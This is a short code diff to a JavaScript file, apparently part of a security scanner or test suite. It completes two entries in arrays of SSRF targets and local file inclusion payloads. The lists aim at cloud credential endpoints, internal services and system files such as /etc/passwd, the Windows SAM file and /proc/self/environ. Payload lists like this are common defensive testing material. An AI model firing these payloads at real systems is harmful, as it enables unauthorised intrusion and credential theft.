@@ -65,14 +65,14 @@ const SSRF_TARGETS = [
     "http://localhost:6379/",
     "http://127.0.0.1:9200/_cat/indices",
     "http://169.254.170.2/v2/credentials",
-    "file:/
+    "file:///etc/passwd",
     "gopher://127.0.0.1:3306/_",
     "dict://127.0.0.1:11211/stats"
 ];
 const LFI_PAYLOADS = [
     "../../../../etc/passwd",
     "..\\..\\..\\..\\windows\\system32\\config\\sam",
-    "....
+    "../../../../windows/system.ini",
     "/proc/self/environ",
     "php://filter/convert.base64-encode/resource=index.php",
     "..%252f..%252f..%252fetc%252fpasswd",
